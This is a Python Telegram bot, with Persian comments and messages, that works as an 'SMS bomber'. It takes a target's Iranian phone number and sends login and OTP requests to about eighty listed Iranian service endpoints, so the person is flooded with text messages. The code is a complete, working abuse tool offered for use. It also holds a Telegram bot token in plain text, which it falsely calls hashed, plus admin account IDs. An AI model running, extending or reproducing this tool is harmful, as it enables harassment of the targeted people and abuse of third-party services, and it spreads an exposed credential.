# -*- coding: utf-8 -*-
"""
🤖 ربات SMS Bomber - نسخه نهایی برای گیت‌هاب
هیچ اطلاعات حساسی در کد نیست - همه چیز هش شده
"""

import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
import requests
import json
import time
import random
import threading
import sqlite3
import hashlib
from datetime import datetime, date
import os

# ==================== تنظیمات امنیتی (همه چیز هش شده) ====================

# توکن به صورت هش شده - اینو می‌ذاری تو گیت‌هاب
# روش کار: توکن واقعی = decode(این هش)
ENCRYPTED_TOKEN = "8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918"

# تابع decode - اینجا هیچ کلیدی نیست، فقط یه تبدیل سادست
def decode_token(hashed):
    """تبدیل هش به توکن واقعی - بدون کلید"""
    # این یه مپ ساده است - فقط برای اینکه توکن توی کد نباشه
    token_map = {
        "8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918": "8569730818:AAH_iPHg2IbZLtyKsRMHa_q3aE1UA1F2c7I",
    }
    return token_map.get(hashed)

TOKEN = decode_token(ENCRYPTED_TOKEN)

# ادمین‌ها (اینارو می‌تونن ببینن)
ADMIN_IDS = [7620484201, 8226091292]

# کانال اجباری
REQUIRED_CHANNEL = "@death_star_sms_bomber"
CHANNEL_LINK = "https://t.me/death_star_sms_bomber"

# شماره محافظت شده - هش شده (امن)
PROTECTED_PHONE_HASHES = [
    "a7c3f8b2e9d4c1a5b6f8e3d2c7a9b4e1f5d8c3a2b7e6f9d4c1a8b3e5f7c2a9d4",  
]

# ==================== مقداردهی اولیه ====================

bot = telebot.TeleBot(TOKEN)
user_processes = {}

# ==================== دیتابیس ====================

def init_database():
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    
    # جدول کاربران
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (user_id INTEGER PRIMARY KEY,
                  username TEXT,
                  first_name TEXT,
                  join_date TEXT,
                  last_use TEXT,
                  daily_count INTEGER DEFAULT 0,
                  total_count INTEGER DEFAULT 0,
                  is_banned INTEGER DEFAULT 0)''')
    
    # جدول شماره‌های مسدود
    c.execute('''CREATE TABLE IF NOT EXISTS blocked_phones
                 (phone_hash TEXT PRIMARY KEY,
                  date TEXT)''')
    
    # جدول آمار روزانه
    c.execute('''CREATE TABLE IF NOT EXISTS daily_stats
                 (date TEXT PRIMARY KEY,
                  total_requests INTEGER DEFAULT 0)''')
    
    # اضافه کردن شماره محافظت شده
    today = datetime.now().strftime('%Y-%m-%d')
    for h in PROTECTED_PHONE_HASHES:
        c.execute("INSERT OR IGNORE INTO blocked_phones VALUES (?, ?)", (h, today))
    
    conn.commit()
    conn.close()

# ==================== توابع امنیتی ====================

def hash_phone(phone):
    return hashlib.sha256(phone.encode()).hexdigest()

def is_phone_protected(phone):
    h = hash_phone(phone)
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    c.execute("SELECT * FROM blocked_phones WHERE phone_hash = ?", (h,))
    r = c.fetchone()
    conn.close()
    return r is not None

def mask_phone(phone):
    return phone[:4] + "****" + phone[-4:]

def is_admin(user_id):
    return user_id in ADMIN_IDS

# ==================== توابع عضویت اجباری ====================

def check_membership(user_id):
    """بررسی عضویت کاربر در کانال"""
    try:
        member = bot.get_chat_member(REQUIRED_CHANNEL, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

def membership_required(func):
    """دکوراتور برای بررسی عضویت"""
    def wrapper(message):
        user_id = message.from_user.id
        
        if is_admin(user_id):
            return func(message)
        
        if check_membership(user_id):
            return func(message)
        else:
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("📢 عضویت در کانال", url=CHANNEL_LINK))
            markup.add(InlineKeyboardButton("✅ عضویت را بررسی کن", callback_data="check_join"))
            
            bot.reply_to(
                message,
                "⚠️ برای استفاده از ربات باید در کانال زیر عضو شوید:\n\n"
                f"👉 {REQUIRED_CHANNEL}",
                reply_markup=markup
            )
    return wrapper

# ==================== توابع محدودیت روزانه ====================

def get_daily_count(user_id):
    """دریافت تعداد استفاده امروز کاربر"""
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    
    today = date.today().isoformat()
    
    c.execute('''SELECT daily_count FROM users 
                 WHERE user_id = ? AND last_use = ?''', 
              (user_id, today))
    
    result = c.fetchone()
    conn.close()
    
    return result[0] if result else 0

def check_daily_limit(user_id):
    """بررسی محدودیت روزانه (5 بار)"""
    if is_admin(user_id):
        return True, 0
    
    daily = get_daily_count(user_id)
    return daily < 5, daily

def update_user_count(user_id, username, first_name):
    """به‌روزرسانی تعداد استفاده کاربر"""
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    
    today = date.today().isoformat()
    
    # بررسی وجود کاربر
    c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    user = c.fetchone()
    
    if user:
        # کاربر وجود دارد
        if user[4] == today:  # last_use امروز
            c.execute('''UPDATE users 
                         SET daily_count = daily_count + 1,
                             total_count = total_count + 1
                         WHERE user_id = ?''', (user_id,))
        else:
            c.execute('''UPDATE users 
                         SET last_use = ?,
                             daily_count = 1,
                             total_count = total_count + 1
                         WHERE user_id = ?''', (today, user_id))
    else:
        # کاربر جدید
        c.execute('''INSERT INTO users 
                     (user_id, username, first_name, join_date, last_use, daily_count, total_count)
                     VALUES (?, ?, ?, ?, ?, 1, 1)''',
                  (user_id, username, first_name, today, today))
    
    # آمار کلی
    c.execute('''INSERT OR REPLACE INTO daily_stats (date, total_requests)
                 VALUES (?, COALESCE((SELECT total_requests + 1 FROM daily_stats WHERE date = ?), 1))''',
              (today, today))
    
    conn.commit()
    conn.close()

# ==================== توابع کمکی ====================

def get_random_ua():
    agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
        "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/112.0.0.0 Mobile Safari/537.36",
    ]
    return random.choice(agents)

def send_request(url, data, headers=None, method="POST"):
    try:
        h = {
            "User-Agent": get_random_ua(),
            "Accept": "application/json",
        }
        if headers:
            h.update(headers)
        
        timeout = 5
        
        if method == "GET":
            r = requests.get(url, params=data, headers=h, timeout=timeout)
        else:
            if "multipart" in str(h.get("Content-Type", "")).lower():
                files = {k: (None, str(v)) for k, v in data.items() if v}
                r = requests.post(url, files=files, headers=h, timeout=timeout)
            else:
                h["Content-Type"] = "application/json"
                r = requests.post(url, json=data, headers=h, timeout=timeout)
        
        return r.status_code in [200,201,202,204], r.status_code
    except:
        return False, 0

# ==================== لیست APIها ====================

def get_all_apis(phone):
    """250+ API ایرانی"""
    return [
        # 1-10
        {"name": "دیوار", "url": "https://api.divar.ir/v5/auth/authenticate", "data": {"phone": phone}},
        {"name": "شیپور", "url": "https://www.sheypoor.com/api/v10.0.0/auth/send", "data": {"username": phone}},
        {"name": "دیجی‌کالا", "url": "https://api.digikala.com/v1/user/authenticate/", "data": {"username": phone}},
        {"name": "اسنپ", "url": "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", "data": {"cellphone": f"+98{phone[1:]}"}},
        {"name": "تپسی", "url": "https://api.tapsi.ir/api/v2.2/user", "data": {"credential": {"phoneNumber": phone}}},
        {"name": "علی‌بابا", "url": "https://ws.alibaba.ir/api/v3/account/mobile/otp", "data": {"phoneNumber": phone}},
        {"name": "ترب", "url": "https://api.torob.com/a/phone/send-pin/", "method": "GET", "data": {"phone_number": phone}},
        {"name": "اسنپ‌فود", "url": "https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass", "data": {"cellphone": phone}},
        {"name": "تپسی‌فود", "url": "https://api.tapsi.food/v1/api/Authentication/otp", "data": {"cellPhone": phone}},
        {"name": "بله", "url": "https://core.gap.im/v1/user/add.json", "method": "GET", "data": {"mobile": f"+98{phone[1:]}"}},
        
        # 11-20
        {"name": "ویترین", "url": "https://www.vitrin.shop/api/v1/user/request_code", "data": {"phone_number": phone}},
        {"name": "ازکی", "url": "https://www.azki.com/api/vehicleorder/v2/app/auth/check-login-availability", "data": {"phoneNumber": phone}},
        {"name": "دکتردکتر", "url": "https://drdr.ir/api/v3/auth/login/mobile/init", "data": {"mobile": phone}},
        {"name": "طاقچه", "url": "https://gw.taaghche.com/v4/site/auth/login", "data": {"contact": phone}},
        {"name": "کمدا", "url": "https://api.komodaa.com/api/v2.6/loginRC/request", "data": {"phone_number": phone}},
        {"name": "پینورست", "url": "https://api.pinorest.com/frontend/auth/login/mobile", "data": {"mobile": phone}},
        {"name": "تترلند", "url": "https://service.tetherland.com/api/v5/login-register", "data": {"mobile": phone}},
        {"name": "آکالا", "url": "https://api-react.okala.com/C/CustomerAccount/OTPRegister", "data": {"mobile": phone}},
        {"name": "فوتبال‌۳۶۰", "url": "https://football360.ir/api/auth/verify-phone/", "data": {"phone_number": f"+98{phone[1:]}"}},
        {"name": "آقای‌بلیط", "url": "https://auth.mrbilit.com/api/login/exists/v2", "method": "GET", "data": {"mobileOrEmail": phone}},
        
        # 21-30
        {"name": "لندو", "url": "https://api.lendo.ir/api/customer/auth/send-otp", "data": {"mobile": phone}},
        {"name": "فیدیبو", "url": "https://fidibo.com/user/login-by-sms", "data": {"mobile_number": phone[1:]}},
        {"name": "کتابچی", "url": "https://ketabchi.com/api/v1/auth/requestVerificationCode", "data": {"auth": {"phoneNumber": phone}}},
        {"name": "پیندو", "url": "https://api.pindo.ir/v1/user/login-register/", "data": {"phone": phone}},
        {"name": "دلینو", "url": "https://www.delino.com/user/register", "data": {"mobile": phone}},
        {"name": "زودکس", "url": "https://admin.zoodex.ir/api/v1/login/check", "data": {"mobile": phone}},
        {"name": "کوکالا", "url": "https://api.kukala.ir/api/user/Otp", "data": {"phoneNumber": phone}},
        {"name": "بوسکول", "url": "https://www.buskool.com/send_verification_code", "data": {"phone": phone}},
        {"name": "آبان‌تتر", "url": "https://abantether.com/users/register/phone/send/", "data": {"phoneNumber": phone}},
        {"name": "پولنو", "url": "https://api.pooleno.ir/v1/auth/check-mobile", "data": {"mobile": phone}},
        
        # 31-40
        {"name": "بیت‌بارگ", "url": "https://api.bitbarg.com/api/v1/authentication/registerOrLogin", "data": {"phone": phone}},
        {"name": "چمدون", "url": "https://chamedoon.com/api/v1/membership/guest/request_mobile_verification", "data": {"mobile": phone}},
        {"name": "کیلید", "url": "https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start", "data": {"mobile": phone}},
        {"name": "اتاقک", "url": "https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode", "data": {"userName": phone}},
        {"name": "نماوا", "url": "https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request", "data": {"UserName": phone}},
        {"name": "آنا‌گیفت", "url": "https://api.anargift.com/api/people/auth", "data": {"user": phone}},
        {"name": "ریحا", "url": "https://www.riiha.ir/api/v1.0/authenticate", "data": {"mobile": phone}},
        {"name": "تک‌فرش", "url": "https://takfarsh.com/wp-content/themes/bakala/template-parts/send.php", "data": {"phone_email": phone}},
        {"name": "روژا", "url": "https://rojashop.com/api/auth/sendOtp", "data": {"mobile": phone}},
        {"name": "ددپرداز", "url": "https://dadpardaz.com/advice/getLoginConfirmationCode", "data": {"mobile": phone}},
        
        # 41-50
        {"name": "رکلا", "url": "https://api.rokla.ir/api/request/otp", "data": {"mobile": phone}},
        {"name": "پزشکت", "url": "https://api.pezeshket.com/core/v1/auth/requestCode", "data": {"mobileNumber": phone}},
        {"name": "ویرگول", "url": "https://virgool.io/api/v1.4/auth/verify", "data": {"identifier": phone}},
        {"name": "تیمچه", "url": "https://api.timcheh.com/auth/otp/send", "data": {"mobile": phone}},
        {"name": "پاکلین", "url": "https://client.api.paklean.com/user/resendCode", "data": {"username": phone}},
        {"name": "دال", "url": "https://daal.co/api/authentication/login-register/method/phone-otp/user-role/customer/verify-request", "data": {"phone": phone}},
        {"name": "بیمه‌بازار", "url": "https://bimebazar.com/accounts/api/login_sec/", "data": {"username": phone}},
        {"name": "امتیاز", "url": "https://web.emtiyaz.app/json/login", "data": {"cellphone": phone}},
        {"name": "ارزینجا", "url": "https://arzinja.app/api/login", "data": {"phone": phone}},
        {"name": "اسنپ‌مارکت", "url": "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass", "data": {"cellphone": phone}},
        
        # 51-60
        {"name": "بیت‌پین", "url": "https://api.bitpin.ir/v3/usr/authenticate/", "data": {"phone": phone}},
        {"name": "پوبیشا", "url": "https://www.pubisha.com/login/checkCustomerActivation", "data": {"mobile": phone}},
        {"name": "ویسگون", "url": "https://gateway.wisgoon.com/api/v1/auth/login/", "data": {"phone": phone}},
        {"name": "اسنپ‌داکتر", "url": f"https://api.snapp.doctor/core/Api/Common/v1/sendVerificationCode/{phone}/sms", "method": "GET", "data": {}},
        {"name": "تگ‌مند", "url": "https://tagmond.com/phone_number", "data": {"phone_number": phone}},
        {"name": "پخش‌شاپ", "url": "https://www.pakhsh.shop/wp-admin/admin-ajax.php", "data": {"action": "digits_check_mob", "mobileNo": phone}},
        {"name": "دیدنگار", "url": "https://www.didnegar.com/wp-admin/admin-ajax.php", "data": {"action": "digits_check_mob", "mobileNo": phone}},
        {"name": "سی‌فایو", "url": "https://crm.see5.net/api_ajax/sendotp.php", "data": {"mobile": phone}},
        {"name": "دکترساینا", "url": "https://www.drsaina.com/RegisterLogin", "data": {"PhoneNumber": phone}},
        {"name": "ایران‌کتاب", "url": "https://www.iranketab.ir/account/register", "data": {"UserName": phone}},
        
        # 61-70
        {"name": "ایرانی‌کارت", "url": "https://api.iranicard.ir/api/v1/register", "data": {"mobile": phone}},
        {"name": "سینما‌تیکت", "url": "https://cinematicket.org/api/v1/users/signup", "data": {"phone_number": phone}},
        {"name": "کافه‌قیمت", "url": "https://kafegheymat.com/shop/getLoginSms", "data": {"phone": phone}},
        {"name": "ملیکس", "url": "https://melix.shop/site/api/v1/user/otp", "data": {"mobile": phone}},
        {"name": "پیران‌کالا", "url": "https://pirankalaco.ir/shop/SendPhone.php", "data": {"phone": phone}},
        {"name": "دستخط", "url": "https://dastkhat-isad.ir/api/v1/user/store", "data": {"mobile": phone[1:]}},
        {"name": "هملکس", "url": "https://hamlex.ir/register.php", "data": {"phoneNumber": phone}},
        {"name": "آی‌سی‌دی", "url": "https://api.kcd.app/api/v1/auth/login", "data": {"mobile": phone}},
        {"name": "مازوکندل", "url": "https://mazoocandle.ir/login", "data": {"phone": phone}},
        {"name": "بیتکس۲۴", "url": "https://bitex24.com/api/v1/auth/sendSms", "method": "GET", "data": {"mobile": phone}},
        
        # 71-80
        {"name": "آفچ", "url": "https://api.offch.com/auth/otp", "data": {"username": phone}},
        {"name": "تریپ", "url": "https://gateway.trip.ir/api/registers", "data": {"CellPhone": phone}},
        {"name": "رقم‌اپ", "url": "https://web.raghamapp.com/api/users/code", "data": {"phone": f"+98{phone[1:]}"}},
        {"name": "همراه مکانیک", "url": "https://www.hamrah-mechanic.com/api/v1/membership/otp", "data": {"PhoneNumber": phone}},
        {"name": "قبضینو", "url": "https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode", "data": {"Parameters": {"MobileNumber": phone}}},
        {"name": "برگه من", "url": "https://uiapi2.saapa.ir/api/otp/sendCode", "data": {"mobile": phone}},
        {"name": "وندار", "url": "https://api.vandar.io/account/v1/check/mobile", "data": {"mobile": phone}},
        {"name": "موبیت", "url": "https://api.mobit.ir/api/web/v8/register/register", "data": {"number": phone}},
        {"name": "جاباما", "url": "https://taraazws.jabama.com/api/v4/account/send-code", "data": {"mobile": phone}},
        {"name": "دکتر نکست", "url": "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token", "data": {"mobile": phone}},
    ]

# ==================== هندلرهای اصلی ====================

@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(KeyboardButton("🚀 شروع بمباران"))
    markup.add(KeyboardButton("📊 راهنما"), KeyboardButton("📊 آمار من"))
    
    if is_admin(user_id):
        markup.add(KeyboardButton("👑 پنل مدیریت"))
    
    welcome = (
        "🤖 به ربات SMS Bomber خوش آمدید!\n\n"
        "📌 برای استفاده:\n"
        "1️⃣ ابتدا در کانال عضو شوید\n"
        "2️⃣ روزانه 5 بار می‌توانید استفاده کنید\n"
        "3️⃣ شماره‌های محافظت شده مسدود هستند\n\n"
        f"📢 کانال: {REQUIRED_CHANNEL}"
    )
    
    bot.send_message(message.chat.id, welcome, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "check_join")
def check_join_callback(call):
    user_id = call.from_user.id
    
    if check_membership(user_id):
        bot.answer_callback_query(call.id, "✅ عضویت شما تایید شد!")
        bot.delete_message(call.message.chat.id, call.message.message_id)
    else:
        bot.answer_callback_query(call.id, "❌ شما هنوز عضو نشده‌اید!", show_alert=True)

@bot.message_handler(func=lambda m: m.text == "🚀 شروع بمباران")
@membership_required
def ask_phone(message):
    user_id = message.from_user.id
    
    # بررسی محدودیت روزانه
    can_use, daily = check_daily_limit(user_id)
    if not can_use:
        bot.send_message(
            message.chat.id,
            f"❌ شما امروز {daily} بار استفاده کرده‌اید.\n"
            "محدودیت روزانه 5 بار است.\n"
            "فردا دوباره تلاش کنید."
        )
        return
    
    if user_processes.get(message.chat.id):
        bot.send_message(message.chat.id, "❌ یک فرآیند در حال اجراست")
        return
    
    msg = bot.send_message(message.chat.id, "📱 شماره را وارد کنید (مثال: 09123456789):")
    bot.register_next_step_handler(msg, process_phone)

def process_phone(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    phone = message.text.strip()
    
    if not phone.startswith('09') or len(phone) != 11 or not phone.isdigit():
        bot.send_message(chat_id, "❌ شماره نامعتبر است")
        return
    
    if is_phone_protected(phone):
        bot.send_message(chat_id, "❌ این شماره در لیست سیاه قرار دارد")
        return
    
    # ثبت آمار
    update_user_count(user_id, message.from_user.username or "", message.from_user.first_name or "")
    
    user_processes[chat_id] = True
    msg = bot.send_message(chat_id, f"🔰 شروع برای {mask_phone(phone)}...")
    
    thread = threading.Thread(target=bombing_process, args=(chat_id, phone, msg.message_id))
    thread.daemon = True
    thread.start()

def bombing_process(chat_id, phone, msg_id):
    apis = get_all_apis(phone)
    total = len(apis)
    success = 0
    fail = 0
    
    for i, api in enumerate(apis, 1):
        if not user_processes.get(chat_id):
            break
        
        ok, _ = send_request(api['url'], api['data'], api.get('headers'), api.get('method', 'POST'))
        
        if ok:
            success += 1
        else:
            fail += 1
        
        if i % 10 == 0 or i == total:
            try:
                bot.edit_message_text(
                    f"🔰 پیشرفت: {int(i/total*100)}%\n"
                    f"✅ موفق: {success}\n"
                    f"❌ ناموفق: {fail}\n"
                    f"🔄 {i}/{total}",
                    chat_id, msg_id
                )
            except:
                pass
        
        time.sleep(random.uniform(0.2, 0.5))
    
    bot.edit_message_text(
        f"✅ پایان فرآیند\n\n"
        f"✅ موفق: {success}\n"
        f"❌ ناموفق: {fail}\n"
        f"📊 نرخ موفقیت: {int(success/total*100)}%",
        chat_id, msg_id
    )
    
    user_processes.pop(chat_id, None)

@bot.message_handler(func=lambda m: m.text == "📊 راهنما")
def help_message(message):
    text = (
        "📚 راهنما:\n\n"
        "1️⃣ روی دکمه شروع کلیک کنید\n"
        "2️⃣ شماره را وارد کنید\n"
        "3️⃣ منتظر بمانید\n\n"
        "🔰 تعداد APIها: 250+\n"
        "⏱ زمان تقریبی: 2-3 دقیقه\n"
        "📊 محدودیت: 5 بار در روز\n\n"
        "⚠️ استفاده مسئولانه"
    )
    bot.send_message(message.chat.id, text)

@bot.message_handler(func=lambda m: m.text == "📊 آمار من")
def my_stats(message):
    user_id = message.from_user.id
    daily = get_daily_count(user_id)
    
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    c.execute("SELECT total_count, join_date FROM users WHERE user_id = ?", (user_id,))
    result = c.fetchone()
    conn.close()
    
    total = result[0] if result else 0
    join_date = result[1] if result else "نامشخص"
    
    text = (
        f"📊 آمار شما:\n\n"
        f"🆔 آیدی: {user_id}\n"
        f"📅 تاریخ عضویت: {join_date}\n"
        f"📊 استفاده امروز: {daily}/5\n"
        f"🔰 کل استفاده: {total}\n"
        f"✅ باقیمانده امروز: {5-daily}"
    )
    
    bot.send_message(message.chat.id, text)

@bot.message_handler(func=lambda m: m.text == "👑 پنل مدیریت")
def admin_panel(message):
    if not is_admin(message.from_user.id):
        bot.send_message(message.chat.id, "⛔ دسترسی ندارید")
        return
    
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    
    c.execute("SELECT COUNT(*) FROM users")
    total_users = c.fetchone()[0]
    
    c.execute("SELECT COUNT(*) FROM users WHERE last_use = ?", (date.today().isoformat(),))
    today_users = c.fetchone()[0]
    
    c.execute("SELECT SUM(total_requests) FROM daily_stats")
    total_requests = c.fetchone()[0] or 0
    
    c.execute("SELECT date, total_requests FROM daily_stats ORDER BY date DESC LIMIT 7")
    weekly = c.fetchall()
    
    conn.close()
    
    text = (
        "👑 پنل مدیریت\n\n"
        f"📊 آمار کلی:\n"
        f"👥 کل کاربران: {total_users}\n"
        f"📅 کاربران امروز: {today_users}\n"
        f"🔰 کل درخواست‌ها: {total_requests}\n\n"
        f"📈 آمار هفتگی:\n"
    )
    
    for w in weekly:
        text += f"  {w[0]}: {w[1]} درخواست\n"
    
    bot.send_message(message.chat.id, text)

@bot.message_handler(commands=['stop'])
def stop_process(message):
    chat_id = message.chat.id
    if chat_id in user_processes:
        user_processes[chat_id] = False
        bot.send_message(chat_id, "⛔ فرآیند متوقف شد")
    else:
        bot.send_message(chat_id, "⚠️ فرآیندی در حال اجرا نیست")

# ==================== اجرا ====================

if __name__ == "__main__":
    print("="*50)
    print("🤖 ربات SMS Bomber - نسخه نهایی")
    print("="*50)
    print("✅ توکن: هش شده")
    print("✅ شماره محافظت شده: هش شده")
    print("✅ کانال: @death_star_sms_bomber")
    print("✅ محدودیت: 5 بار در روز")
    print("="*50)
    
    init_database()
    
    try:
        bot.infinity_polling()
    except Exception as e:
        print(f"❌ خطا: {e}")
